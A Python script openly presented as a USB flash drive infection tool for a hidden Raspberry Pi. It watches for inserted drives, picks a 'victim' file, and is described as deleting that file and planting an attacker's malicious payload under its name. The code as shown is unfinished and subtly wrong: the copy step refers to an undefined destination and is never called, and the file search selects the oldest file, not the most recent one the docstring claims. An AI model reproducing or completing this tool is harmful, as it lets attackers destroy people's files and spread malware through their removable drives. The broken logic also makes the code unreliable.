'''
usb flash drive infection tool
used for quickly injecting malicious files into (victim's) nearby accessible drives
intended use for small concealable raspberrry pi systems like Zero W
---------
WARNING: may damage a file in the drive
listens for drives to be inserted
once it finds one, it looks for the most recent file created on the drive
it will delete that file and replace it with a malicious payload created by the atttacker
the name will be copied but the type may be different (depending on the exploit)
if the drive is empty it will create a README.*type* where *type* is the exploit file type
'''
import os
import shutil
import sys
import socket
import time

host = socket.gethostname()
src = "inject.txt"
devices = ["A:", "B:", "E:", "F:", "G:"]
letter=""
def isDriveInserted():
	for path in devices:
		if os.path.exists(path):
			getPath(path)
			return True
	return False
def getPath(Letter):
	global letter
	letter = Letter

def initiateUSBListener():
	if(isDriveInserted() == False):
		time.sleep(1)
		initiateUSBListener()
	elif (isDriveInserted() == True):
		time.sleep(1)
		return

def copyFile(src):
    try:
        shutil.copy(src, dest)

    except shutil.Error as e:
        print('Error: %s' % e)
 
    except IOError as e:
        print('Error: %s' % e.strerror)


#returns the path to the file with the most recent modification(in seconds)
def treeFindMostRecent(Letter):
	#if the drive has no folders, only files
	ctime = 1536955389
	victimFile =""
	for dir, subdir, files in os.walk(Letter, topdown=False):
 		for file in files:
 			if(len(subdir) == 0):
 				path =  dir + '\\' + file
 				print(path)
 				time = os.path.getctime(path)
 				if (time < ctime):
 					ctime = time
 					
 					victimFile = path
 			else:
 				sdir = '\\'.join(subdir)
 				path =  dir + '\\' + sdir + '\\' +file
 				if (os.path.exists(path)):
 					print(path)
 					time = os.path.getctime(path)
 					if (time < ctime):
 						ctime = time
 						
 						victimFile = path			
	return victimFile		


def main():
	exploitDir = str(sys.argv[1])
	print("listening for USB flash drive...")
	initiateUSBListener()
	print("Drive found!!", " it is at ", letter)
	print("looking for file to infect..")
	print("found a file! it is: ",treeFindMostRecent(letter))
if __name__ == "__main__":
    main()
